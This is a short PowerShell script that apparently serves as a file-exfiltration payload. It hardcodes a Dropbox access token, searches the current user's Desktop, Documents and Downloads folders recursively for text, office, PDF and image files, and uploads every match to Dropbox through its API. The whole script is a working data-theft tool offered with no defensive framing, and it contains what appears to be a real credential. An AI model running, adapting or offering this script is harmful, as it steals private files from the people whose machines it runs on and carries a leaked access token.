function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.BP9Mbwv8ZEVawrtJYPnhHDO1oEA9jttvOu-JbbaSUmEKQd04MiC4Tdh3OTVsnJNUC2TY_jE6VVHrwmcEiK5JfSzdB8ozIO2aItXn7dFBSkH-75Zy8JUGk0WNSpZYoIvLY4aj_eug"   # Replace with your DropBox Access Token
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}


$src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads"
#copy files to one folder
foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse | %{$_.FullName}){    
    
    $files | DropBox-Upload
    
}
